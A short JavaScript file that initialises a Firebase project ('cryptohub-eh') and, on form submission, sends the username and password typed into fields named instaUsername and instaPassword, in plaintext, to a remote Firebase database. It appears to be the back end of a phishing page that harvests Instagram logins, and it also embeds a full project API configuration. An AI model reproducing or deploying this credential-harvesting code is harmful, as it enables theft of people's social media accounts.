// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyDCcf9XYXhvM0g8SUKb8qZeqEycx-jNCCc",
    authDomain: "cryptohub-eh.firebaseapp.com",
    databaseURL: "https://cryptohub-eh-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "cryptohub-eh",
    storageBucket: "cryptohub-eh.firebasestorage.app",
    messagingSenderId: "150967492197",
    appId: "1:150967492197:web:67b1bd1678fca2d295708c",
    measurementId: "G-P58EZLKP7F"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Handle form submission
document.getElementById("registrationForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let username = document.getElementById("instaUsername").value;
    let password = document.getElementById("instaPassword").value;

    if (username && password) {
        database.ref('users/').push({
            username: username,
            password: password,
            timestamp: new Date().toISOString()
        }).then(() => {
            // Show success message
            document.getElementById("successMessage").style.display = "block";

            // Reset form fields
            document.getElementById("registrationForm").reset();
        }).catch((error) => {
            console.error("Error saving data:", error);
        });
    }
});
